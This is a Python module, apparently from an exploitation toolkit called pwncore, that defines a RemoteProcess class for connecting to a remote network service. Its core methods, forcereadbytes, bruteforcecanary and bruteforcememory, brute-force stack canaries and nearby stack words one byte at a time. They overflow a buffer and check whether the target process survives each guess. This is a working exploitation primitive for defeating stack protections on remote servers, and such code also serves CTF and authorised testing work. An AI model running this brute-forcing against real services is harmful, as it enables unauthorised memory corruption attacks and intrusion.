import typing
import socket
import time
import errno
import struct
from abc import abstractmethod

from pytoolcore import style
from pytoolcore import utils
from pytoolcore import netutils
from pytoolcore import exception

from pwncore import pwnutils


class RemoteProcess:

    def __init__(self, rsockaddr: typing.Tuple[typing.Any, ...], architecture: pwnutils.Architecture,
                 timeout: float = 0.02, protocol4: int = socket.SOCK_STREAM) -> None:
        self.__rsockaddr__: typing.Tuple[typing.Any, ...] = rsockaddr
        self.__protocol4__: int = protocol4
        self.__skt__: socket.socket = None
        self.__timeout__: float = timeout
        self.__architecture__: pwnutils.Architecture = architecture
        self.__canary__: int = 0

    @property
    def timeout(self) -> float:
        return self.__timeout__

    @timeout.setter
    def timeout(self, timeout: float) -> None:
        self.__timeout__ = timeout

    @property
    def skt(self) -> socket.socket:
        return self.__skt__

    def connect(self) -> None:
        self.disconnect()
        protocol3: int = netutils.host2protocol(self.__rsockaddr__[0])
        self.__skt__: socket.socket = socket.socket(protocol3, self.__protocol4__)
        try:
            if self.__protocol4__ == socket.SOCK_STREAM:
                self.__skt__.connect(self.__rsockaddr__)
        except(socket.error, socket.herror, socket.gaierror, socket.timeout) as err:
            self.disconnect()
            raise (exception.ErrorException(str(err)))

    def disconnect(self) -> None:
        if self.__skt__ is not None:
            self.__skt__.close()
            self.__skt__ = None

    @abstractmethod
    def ready(self) -> None:
        pass

    def clear(self, timeout: float = 0.01):
        time.sleep(self.__timeout__)
        self.__skt__.settimeout(timeout)
        try:
            while self.__skt__.recv(4096):
                pass
        except socket.timeout:
            pass
        self.__skt__.settimeout(None)

    @abstractmethod
    def alive(self) -> bool:
        alive: bool = True
        self.__skt__.setblocking(False)
        for i in range(100):
            try:
                self.__skt__.recv(1)
                alive = False
                break
            except socket.error as err:
                errcode = err.args[0]
                if errcode == errno.EAGAIN:
                    time.sleep(self.__timeout__)
                else:
                    alive = False
                    break
        return alive

    def recv(self, size: int, timeout: int=None) -> bytes:
        self.__skt__.settimeout(timeout)
        res: bytes = b""
        if self.__protocol4__ == socket.SOCK_STREAM:
            res = self.__skt__.recv(size)
        elif self.__protocol4__ == socket.SOCK_DGRAM:
            res = self.__skt__.recvfrom(size)
        self.__skt__.settimeout(None)
        return res

    def send(self, stuff) -> None:
        if self.__protocol4__ == socket.SOCK_STREAM:
            self.__skt__.send(stuff)
        elif self.__protocol4__ == socket.SOCK_DGRAM:
            self.__skt__.sendto(stuff, self.__rsockaddr__)

    # memory stack brute-forcing methods
    def forcereadbytes(self, stuff: bytes=b"", verbose: bool=False) -> int:
        # method that brute-force 4 bytes in the stack for 32 bits architectures
        # and 8 bytes in stack for 64 bits architectures
        res: bytes = b""
        while not len(res) == self.__architecture__.size:
            for byte in [struct.pack("B", x) for x in range(256)]:
                if verbose:
                    print("0x" + b"\x00".hex() * (8 - len(res) - 1) + style.Style.red(byte.hex()) +
                          style.Style.green(res[::-1].hex()), end="\r")
                self.connect()
                self.ready()
                self.send(stuff + res + byte)
                stillalive: bool = self.alive()
                self.disconnect()
                if stillalive:
                    res += byte
                    break
                elif byte == b"\xff":
                    raise exception.FailureException("Failed to brute-force process memory :(")
        if verbose:
            print(utils.bytes2hex(res[::-1]))
        return struct.unpack(self.__architecture__.littleendian, res)[0]

    def bruteforcecanary(self, offset: int, verbose: bool = False) -> int:
        self.__canary__ = self.forcereadbytes(b"A" * offset, verbose)
        return self.__canary__

    def bruteforcememory(self, stuff: bytes, depth: int = 2, verbose: bool = False) -> typing.List[int]:
        results: typing.List[int] = []
        for i in range(depth):
            results.append(self.forcereadbytes(stuff + b"".join([struct.pack(
                self.__architecture__.littleendian, result) for result in results]), verbose))
        return results
